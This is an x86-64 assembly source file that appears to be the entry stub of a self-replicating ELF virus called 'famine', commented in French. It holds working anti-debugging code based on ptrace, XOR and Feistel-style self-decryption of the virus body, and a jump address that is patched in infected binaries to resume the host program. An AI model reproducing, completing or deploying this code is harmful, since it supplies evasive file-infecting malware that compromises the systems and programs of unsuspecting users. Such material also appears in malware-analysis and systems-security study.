bits 64

section .text
	global	_start
	extern	famine

_start:
	push	rax
	push	rbx
	push	rcx
	push	rdx
	push	rsp
    push    rsi
    push    rdi
    push    r15
    push    r14
    push    r13
    push    r12
    push    r11
    push    r10
    push    r9
    push    r8

	jmp NEAR decrypt_done

; _fork:
;     mov rax, 57          ; syscall fork()
;     syscall
;     test rax, rax        ; Vérifier si on est dans le parent ou l'enfant
;     jz _ptrace           ; Si rax == 0, c'est l'enfant
;     jmp parent_process 

; debugger_detected:
;     ; Tuer le processus si un débogueur est détecté
;     ; mov rax, 39           ; getpid syscall
;     ; syscall
;     ; mov rdi, rax
;     ; mov rax, 62           ; kill syscall (SIGKILL)
;     ; syscall
;     mov	rax, 60
; 	mov	rdi, 12
; 	syscall

; parent_process:
;     mov rdi, -1           ; pid = -1 (attendre n'importe quel enfant)
;     xor rsi, rsi          ; status = NULL
;     xor rdx, rdx          ; options = 0
;     mov rax, 61           ; waitpid syscall
;     syscall
;     ; Vérifier le code de retour de l'enfant
;     shr rsi, 8            ; Extraire le code de retour (exit status >> 8)
;     cmp rsi, -1           ; Si le code est -1, un débogueur a été détecté
;     je debugger_detected
;     jmp _manual_modif

_manual_modif:
    lea r15, [rel _ptrace]       ; Début de _ptrace
    lea r14, [rel _ptrace_end]    ; Fin de _ptrace
    lea r13, [rel decrypt]       ; Début de decrypt

.loop:
    cmp r15, r14                 ; while (current_ptrace < end_ptrace)
    jae _ptrace                  ; Si on dépasse la fin, sortir

    mov edx, [r15]               ; Charger 4 octets de _ptrace (clé)
    mov ecx, [r13]               ; Charger 4 octets de decrypt (données chiffrées)
    xor ecx, edx ; Déchiffrer avec XOR
    mov [r13], ecx               ; Sauvegarder les données déchiffrées dans decrypt

    add r15, 4                   ; Avancer de 4 octets dans _ptrace
    add r13, 4                   ; Avancer de 4 octets dans decrypt
    jmp .loop                    ; Répéter la boucle


_ptrace:
    xor rdi, rdi
    xor rsi, rsi
    xor rdx, rdx
    xor r10, r10
    mov rax, 101
    syscall
    ; Vérifier si ptrace a échoué
    test rax, rax
    jge decrypt

    jmp _end

_ptrace_end:
    nop
    nop
    nop
    nop
    nop
    nop
    nop

decrypt:
    lea r8, [rel famine]             ; Adresse de début (famine)
    lea r9, [rel _start]       ; Adresse de fin (_start)
    mov r10, 0x00000000      ; Exemple de clé 64 bits


decrypt_loop:
    mov rax, r9
    sub rax, r8
    cmp rax, 8
    jl decrypt_done                 ; Si r9 - r8 < 8, fin du décryptage

    mov	r12, [r8]                    ; Charger le bloc chiffré dans r12

    mov r14d, r12d                   ; right = partie basse du bloc
    shr r12, 32                      ; Décaler pour obtenir la partie haute
    mov r13d, r12d                   ; left = partie haute du bloc

    mov ecx, 0x7                     ; 8 rounds inverses
    
reverse_rounds:
    mov eax, ecx                     ; Calcul de la sous-clé
    imul eax, eax, 0x1234ABCD        ; subkey = round * 0x1234ABCD
    xor eax, r10d                    ; subkey ^= clé

    ; Feistel déchiffrement
    mov r11d, r14d                   ; temp = right
    mov esi, r14d
    shl esi, 3
    mov edi, r14d
    shr edi, 29
    or  esi, edi
    xor r14d, eax
    add r14d, esi
    xor r14d, r13d                   ; left = right ^ feistel_function(left, subkey)
    mov r13d, r11d                   ; right = temp
    dec ecx
    jns reverse_rounds               ; Répéter pour tous les rounds

    ; Recomposer le bloc déchiffré
    shl r13, 32
    or r14, r13                      ; Fusionner left et right
    mov [r8], r14                    ; Stocker le bloc déchiffré dans la mémoire


    ; Passer au bloc suivant (8 octets)
    add r8, 8
    jmp decrypt_loop

decrypt_done:
	call	famine	

_end:

    pop     r8
    pop     r9
    pop     r10
    pop     r11
    pop     r12
    pop     r13
    pop     r14
    pop     r15
    pop     rdi
    pop     rsi
	pop		rsp
	pop		rdx
	pop		rcx
	pop		rbx
	pop		rax

	jmp	0x4		; Does nothing but is the "lunch-pad" to the real entrypoint.
				; The "0x4" value will be changed on infected binaries to 
				; jump back to the program execution	
	mov	rax, 60
	mov	rdi, 0
	syscall		; exit(0)


section .note.GNU-stack noalloc noexec nowrite progbits
